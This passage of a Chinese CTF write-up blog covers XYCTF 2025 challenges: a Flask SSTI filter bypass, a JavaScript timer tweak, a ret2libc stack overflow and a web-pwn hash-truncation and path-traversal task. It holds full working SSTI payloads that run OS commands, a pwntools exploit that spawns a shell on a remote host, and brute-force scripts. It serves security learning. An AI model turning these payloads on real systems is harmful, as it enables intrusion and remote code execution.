class="keyword">for</span> i <span class="keyword">in</span> lock_within:</span><br><span class="line">                    <span class="keyword">if</span> i <span class="keyword">in</span> name:</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&#x27;NOPE.&#x27;</span></span><br><span class="line">                enable_hook = <span class="literal">True</span></span><br><span class="line">                a = flask.render_template_string(<span class="string">&#x27;&#123;#&#x27;</span>+<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>&#x27;</span>+<span class="string">&#x27;#&#125;&#x27;</span>)</span><br><span class="line">                enable_hook = <span class="literal">False</span></span><br><span class="line">                counter = <span class="number">0</span></span><br><span class="line">                <span class="keyword">return</span> a</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;My inside world is always hidden.&#x27;</span></span><br><span class="line">        <span class="keyword">except</span> RuntimeError <span class="keyword">as</span> e:</span><br><span class="line">            counter = <span class="number">0</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;NO.&#x27;</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Error&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Welcome to Hidden_route!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> _posixsubprocess</span><br><span class="line">        <span class="keyword">del</span> _posixsubprocess.fork_exec</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">import</span> subprocess</span><br><span class="line">    <span class="keyword">del</span> os.popen</span><br><span class="line">    <span class="keyword">del</span> os.system</span><br><span class="line">    <span class="keyword">del</span> subprocess.Popen</span><br><span class="line">    <span class="keyword">del</span> subprocess.call</span><br><span class="line">    <span class="keyword">del</span> subprocess.run</span><br><span class="line">    <span class="keyword">del</span> subprocess.check_output</span><br><span class="line">    <span class="keyword">del</span> subprocess.getoutput</span><br><span class="line">    <span class="keyword">del</span> subprocess.check_call</span><br><span class="line">    <span class="keyword">del</span> subprocess.getstatusoutput</span><br><span class="line">    <span class="keyword">del</span> subprocess.PIPE</span><br><span class="line">    <span class="keyword">del</span> subprocess.STDOUT</span><br><span class="line">    <span class="keyword">del</span> subprocess.CalledProcessError</span><br><span class="line">    <span class="keyword">del</span> subprocess.TimeoutExpired</span><br><span class="line">    <span class="keyword">del</span> subprocess.SubprocessError</span><br><span class="line">    sys.addaudithook(audit_checker)</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure></div>
<p>可以看到过滤的内容是非常多的，flask，有渲染函数<code>flask.render_template_string('')</code>，考虑SSTI，这里把request能用的绕过禁了很多，get
post
cookie等都不行了，但是仍然有可用的，request.mimetype能获取Content-Type的内容，request.authorization.type和request.authorization.token能获取Authorization的内容，中间用空格隔开，request.origin能获取Origin的内容，request.referrer能获取Referrer的内容，这样我们可以去构造注入的payload，考虑寻找eval模块（os被删掉了）重新导入os，经过测试，直接传入<code>?My_ins1de_w0r1d=Follow-your-heart-&#123;%print(config)%&#125;</code>就能成功实现SSTI，所以就在里面构造我们想要的结构，这里对request.mimetype传入abcdefghijklmnopqrstuvwxyz_方便我们提取字符，<code>(request.mimetype)|attr(request.origin)()</code>,再对request.origin传入<code>__getitem__</code>括号里填入0即可提取字母a，于是有<code>&#123;'a':0,'b':1,'c':2,'d':3,'e':4,'f':5,'g':6,'h':7,'i':8,'j':9,'k':10,'l':11,'m':12,'n':13,'o':14,'p':15,'q':16,'r':17,'s':18,'t':19,'u':20,'v':21,'w':22,'x':23,'y':24,'z':25,'_':26&#125;</code>字符之间用~连接，于是我们得到</p>
<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">__class__:(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(2)~(request.mimetype)|attr(request.origin)(11)~(request.mimetype)|attr(request.origin)(0)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26)</span><br><span class="line"></span><br><span class="line">__base__:(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(1)~(request.mimetype)|attr(request.origin)(0)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(4)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26)</span><br><span class="line"></span><br><span class="line">__subclasses__:(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(20)~(request.mimetype)|attr(request.origin)(1)~(request.mimetype)|attr(request.origin)(2)~(request.mimetype)|attr(request.origin)(11)~(request.mimetype)|attr(request.origin)(0)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(4)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26)</span><br><span class="line"></span><br><span class="line">__init__:(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(8)~(request.mimetype)|attr(request.origin)(13)~(request.mimetype)|attr(request.origin)(8)~(request.mimetype)|attr(request.origin)(19)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26)</span><br><span class="line"></span><br><span class="line">__globals__:(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(6)~(request.mimetype)|attr(request.origin)(11)~(request.mimetype)|attr(request.origin)(14)~(request.mimetype)|attr(request.origin)(1)~(request.mimetype)|attr(request.origin)(0)~(request.mimetype)|attr(request.origin)(11)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26)</span><br></pre></td></tr></table></figure></div>
<p>并且我们利用request.authorization.type传入<code>__builtins__</code>写脚本查找具有eval函数的模块</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># 使用 python 脚本 用于寻找序号</span></span><br><span class="line">url = <span class="string">&quot;http://eci-2zeblgk0r4vs0gptx806.cloudeci1.ichunqiu.com:8080/H3dden_route&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    temp=<span class="string">&quot;Follow-your-heart-&#123;%print(()|attr((request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(2)~(request.mimetype)|attr(request.origin)(11)~(request.mimetype)|attr(request.origin)(0)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26))|attr((request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(1)~(request.mimetype)|attr(request.origin)(0)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(4)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26))|attr((request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(20)~(request.mimetype)|attr(request.origin)(1)~(request.mimetype)|attr(request.origin)(2)~(request.mimetype)|attr(request.origin)(11)~(request.mimetype)|attr(request.origin)(0)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(4)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26))()|attr(request.origin)(&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;)|attr((request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(8)~(request.mimetype)|attr(request.origin)(13)~(request.mimetype)|attr(request.origin)(8)~(request.mimetype)|attr(request.origin)(19)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26))|attr((request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(6)~(request.mimetype)|attr(request.origin)(11)~(request.mimetype)|attr(request.origin)(14)~(request.mimetype)|attr(request.origin)(1)~(request.mimetype)|attr(request.origin)(0)~(request.mimetype)|attr(request.origin)(11)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26))|attr(request.origin)(request.authorization.type))%&#125;&quot;</span></span><br><span class="line">    header=&#123;</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;abcdefghijklmnopqrstuvwxyz_&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Origin&quot;</span>: <span class="string">&#x27;__getitem__&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;Authorization&quot;</span>: <span class="string">&quot;__builtins__&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data=&#123;<span class="string">&quot;My_ins1de_w0r1d&quot;</span>:temp&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url,params=data,headers=header)</span><br><span class="line">        <span class="comment">#print(response.text)</span></span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> response.text:     <span class="comment">#更改要查找的模块（引号内）</span></span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406201519395.png"
                      class=""
                >
<p>我这里随便选了一个118，然后继续构造eval以及执行内容，用request.authorization.token传入eval，用request.referrer传入内容<code>__import__('os').popen('ls /').read()</code>这样可以读取到根目录的信息</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/QQ%E5%9B%BE%E7%89%8720250406204757.png"
                      class=""
                >
<p>但是我cat
/f*却报错了，原来是文件太大没法读取，于是想利用服务器开一个端口用来让我下载文件，命令为<code>cd / &amp;&amp; python3 -m http.server 8088</code></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span>  requests</span><br><span class="line">url=<span class="string">&quot;http://eci-2zeblgk0r4vs0gptx806.cloudeci1.ichunqiu.com/H3dden_route&quot;</span></span><br><span class="line">payload=<span class="string">&quot;Follow-your-heart-&#123;%print(()|attr((request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(2)~(request.mimetype)|attr(request.origin)(11)~(request.mimetype)|attr(request.origin)(0)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26))|attr((request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(1)~(request.mimetype)|attr(request.origin)(0)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(4)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26))|attr((request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(20)~(request.mimetype)|attr(request.origin)(1)~(request.mimetype)|attr(request.origin)(2)~(request.mimetype)|attr(request.origin)(11)~(request.mimetype)|attr(request.origin)(0)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(4)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26))()|attr(request.origin)(118)|attr((request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(8)~(request.mimetype)|attr(request.origin)(13)~(request.mimetype)|attr(request.origin)(8)~(request.mimetype)|attr(request.origin)(19)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26))|attr((request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(6)~(request.mimetype)|attr(request.origin)(11)~(request.mimetype)|attr(request.origin)(14)~(request.mimetype)|attr(request.origin)(1)~(request.mimetype)|attr(request.origin)(0)~(request.mimetype)|attr(request.origin)(11)~(request.mimetype)|attr(request.origin)(18)~(request.mimetype)|attr(request.origin)(26)~(request.mimetype)|attr(request.origin)(26))|attr(request.origin)(request.authorization.type)|attr(request.origin)(request.authorization.token)(request.referrer))%&#125;&quot;</span></span><br><span class="line">data=&#123;<span class="string">&quot;My_ins1de_w0r1d&quot;</span>:payload&#125;</span><br><span class="line">header=&#123;</span><br><span class="line"><span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz_&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;__getitem__&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&#x27;__builtins__ eval&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Referer&#x27;</span>: <span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cd / &amp;&amp; python3 -m http.server 8088&#x27;).read()&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">res=requests.get(url,params=data,headers=header)</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406205012191.png"
                      class=""
                >
<p>下载flag_h3r3</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/QQ%E5%9B%BE%E7%89%8720250406205318.png"
                      class=""
                >
<p>得到flag为flag{N0w_y0u_sEEEEEEEEEEEEEEE_m3!!!!!!}</p>
<h4 id="web-ez_puzzle">web-ez_puzzle</h4>
<p>1.前端这种题找一圈也就只有这个js看起来很不一般的样子（真乱啊），那些解混淆工具也没成功。自己做的时候没找到有用的，还以为要从逻辑里找到恢复解压缩前面那坨c的类base64的东西。不过队里的其它师傅通过搜索if搜索审阅，硬是找到了这里可疑的变量yw4。后来想了想根据这个机制，搜索<或者>也可行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406230240750.png"
                      alt="image-20250406230240750" style="zoom:50%;" 
                ></p>
<p>2.控制台里面可以看到其值为2000,猜测就是限制2秒</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406230902822.png"
                      alt="image-20250406230902822" style="zoom:50%;" 
                ></p>
<p>3.把限制时间改长，改成9999999999999999999999999，慢慢玩就是了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406231331209.png"
                      alt="image-20250406231331209" style="zoom:50%;" 
                ></p>
<p>flag值：flag{Y0u__aRe_a_mAsteR_of_PUzZL!!@!!~!}</p>
<h4 id="pwn-ret2libcs-revenge">pwn-Ret2libc's Revenge</h4>
<p>这题我应该想复杂了，说是签到题，搞得非常麻烦，感觉是做过来偏难的题。首先最烦的是这个<strong>init</strong>函数设置标准输出是全缓冲，这直接导致我需要占满整个缓冲区才能在终端看到回显。这里我本地利用程序自带的输出先走53次就能使缓冲区临近溢出，而远程服务器需要214次才能快占满缓冲区。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406130641781.png"
                      class=""
                >
<p>主要的漏洞函数就是一个无限制的栈溢出，遇到换行符结束。需要注意的是，这里是一个字节一个字节读取，栈上有变量存当前读取下标，覆盖到该下标后就可以跳跃到返回地址进行覆盖。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406131116881.png"
                      class=""
                >
<p>麻烦的是如何泄露libc基址，这个程序里没有控rdi的gadget，而且动态调试时看到feof之后的寄存器状态也没有可利用的内容。我们需要想办法控制rdi为libc相关地址然后<strong>call
puts</strong>来泄露libc基址。这里我采用的是下面两个gadget的组合。首先第一次溢出先覆盖rbp，然后返回到<strong>revenge</strong>函数，这样可以让我们读取内容到可控的地址，这里我选择的是覆盖rbp为<strong>0x404900</strong>，然后就能往可控的地址处读入函数的<strong>got</strong>表地址或者在bss段的<strong>FILE</strong>结构体地址。这样之后就可以通过处于<strong>0x401274</strong>的gadget来控制eax，之后再利用init函数中setvbuf传参控制rdi，之后就能回到<strong>puts</strong>函数泄露libc地址。这里能成功地关键在于<strong>setvbuf</strong>函数非法调用结束后不会改变rdi的内容，这里的成功率为50%，调用时会把rdi中相关的内容与0x8000进行按位与提取位，可能会进入别的分支导致程序直接崩溃。</p>
<p>有了libc基址后记得返回时不要回到main函数开头，不知道为什么再次调用init函数后，之后输入就会出现问题。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406132515219.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406132529260.png"
                      class=""
                >
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">main = <span class="number">0x000000000040127B</span></span><br><span class="line">puts_plt = <span class="number">0x0000000000401070</span></span><br><span class="line">call_puts = <span class="number">0x0000000000401294</span> </span><br><span class="line">fgets_plt = <span class="number">0x0000000000401080</span></span><br><span class="line">feof_plt = <span class="number">0x0000000000401090</span></span><br><span class="line">setvbuf_plt = <span class="number">0x00000000004010A0</span></span><br><span class="line">mov_rdi_rsi = <span class="number">0x0000000000401180</span></span><br><span class="line">puts_got = <span class="number">0x0000000000404018</span></span><br><span class="line">stderr = <span class="number">0x404080</span></span><br><span class="line">magic = <span class="number">0x00000000004011F0</span></span><br><span class="line">revenge = <span class="number">0x000000000040120E</span>        </span><br><span class="line">pop_rbp_ret = <span class="number">0x00000000004011FD</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./attachment&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;39.106.69.240&quot;</span>,<span class="number">30802</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 本地53次直接输出</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">214</span>):       </span><br><span class="line">    payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x218</span>,<span class="string">b&quot;\x00&quot;</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x220</span>+<span class="number">5</span>)</span><br><span class="line">    payload += p64(main)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x218</span>,<span class="string">b&quot;\x00&quot;</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x220</span>+<span class="number">5</span>)</span><br><span class="line">payload += p64(pop_rbp_ret) + p64(<span class="number">0x404900</span>) + p64(revenge)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">payload = p32(stderr)*<span class="number">6</span> + p64(mov_rdi_rsi) + p64(magic) + p64(<span class="number">0x404900</span>) + p64(puts_plt) + p64(<span class="number">0x40128D</span>) + p64(<span class="number">0x666</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x218</span>,<span class="string">b&quot;\x00&quot;</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x220</span>+<span class="number">5</span>)</span><br><span class="line">payload += p64(pop_rbp_ret) + p64(<span class="number">0x404900</span>-<span class="number">0x220</span>+<span class="number">0x10</span>) + p64(<span class="number">0x401274</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x21b6a0</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">ret = libc_base + <span class="number">0x0000000000029139</span></span><br><span class="line">bin_sh = libc_base + <span class="number">0x00000000001d8678</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x218</span>,<span class="string">b&quot;\x00&quot;</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x220</span>+<span class="number">5</span>)</span><br><span class="line">payload += p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406215924045.png"
                      class=""
                >
<p>XYCTF{181826fe-77ab-4285-9c46-1c46fdbb93a2}</p>
<h4 id="pwn-web苦手">pwn-web苦手</h4>
<p>一个web
pwn题目，逻辑比较简单，但其实有点不像是pwn题。首先一开始会解析三个get参数。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406133932926.png"
                      class=""
                >
<p>然后看这里的主要逻辑，这里的hash函数是通过具体的加密特征得出的，问了ai可能是<strong>PBKDF2-HMAC-SHA1</strong>算法，然后有个函数会把加密后的内容保存到<strong>dk.dat</strong>文件，这个文件我们实际可以直接访问对应路由下载下来查看加密结果，这里的passwd_re实际re代表register，不能小于63字节。</p>
<p>后面的passwd_lo就相当于login了，会把读入的内容同样加密后和之前注册的进行比较，不能大于63字节。成功后就能够传出filename参数，读取<strong>filename.dat</strong>文件内容了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406134028629.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406134238918.png"
                      class=""
                >
<p>这里一开始我想的是进行爆破相同的hash值，但后来发现比较用的是<strong>strncmp</strong>，可以被<strong></strong>截断，那我们直接爆破hash后首位为<strong></strong>的长短两个密码即可。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pbkdf2_once</span>(<span class="params">password, salt=<span class="string">&quot;XYCTF&quot;</span>, iterations=<span class="number">1</span>, dklen=<span class="number">32</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;使用 PBKDF2-HMAC 进行多次迭代计算&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.pbkdf2_hmac(<span class="string">&#x27;sha1&#x27;</span>, password.encode(), salt.encode(), iterations, dklen)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标 hash（先手动运行一次，得到 32 字节的 hash 进行验证算法是否正确）</span></span><br><span class="line"><span class="comment"># target_hash = pbkdf2_once(&quot;A&quot;*64)</span></span><br><span class="line"><span class="comment"># print(f&quot;Target hash: &#123;target_hash.hex()&#125;&quot;)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_matching_long_password</span>():</span><br><span class="line">    charset = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span></span><br><span class="line">    <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>,<span class="number">70</span>):</span><br><span class="line">        <span class="keyword">for</span> pwd <span class="keyword">in</span> product(charset, repeat=length):</span><br><span class="line">            pwd = <span class="string">&quot;&quot;</span>.join(pwd)</span><br><span class="line">            <span class="keyword">if</span> pbkdf2_once(pwd)[<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Found matching long password: <span class="subst">&#123;pwd&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_matching_short_password</span>():</span><br><span class="line">    <span class="comment"># 尝试爆破短密码</span></span><br><span class="line">    charset = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span></span><br><span class="line">    <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">64</span>):</span><br><span class="line">        <span class="keyword">for</span> pwd <span class="keyword">in</span> product(charset, repeat=length):</span><br><span class="line">            pwd = <span class="string">&quot;&quot;</span>.join(pwd)</span><br><span class="line">            <span class="keyword">if</span> pbkdf2_once(pwd)[<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Found matching password: <span class="subst">&#123;pwd&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">find_matching_long_password()          </span><br><span class="line">find_matching_short_password()</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406220110891.png"
                      class=""
                >
<p>然后可以去读文件，但是服务器上<strong>flag.dat</strong>里是fake_flag，这里注意到<code>snprintf(file, 0x10uLL, "/%s.dat", filename);</code>有长度限制，可以通过加长filename来最后截断<strong>.dat</strong>后缀，最终读<code>../../..//flag</code>即可。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406220227334.png"
                      class=""
                >
<p>XYCTF{837f56a3-160b-4fad-94ac-037166e2635d}</p>
<h4 id="pwn-bot">pwn-bot</h4>
<p>一个经典的protobuf题，首先去手动逆proto结构体，这题里有两个。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406135806428.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406135826050.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406135852679.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406135907187.png"
                      class=""
                >
<p>逆出来的结果如下，protobuf相关内容可见我<a
href="https://collectcrop.github.io/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/">博客</a>。</p>
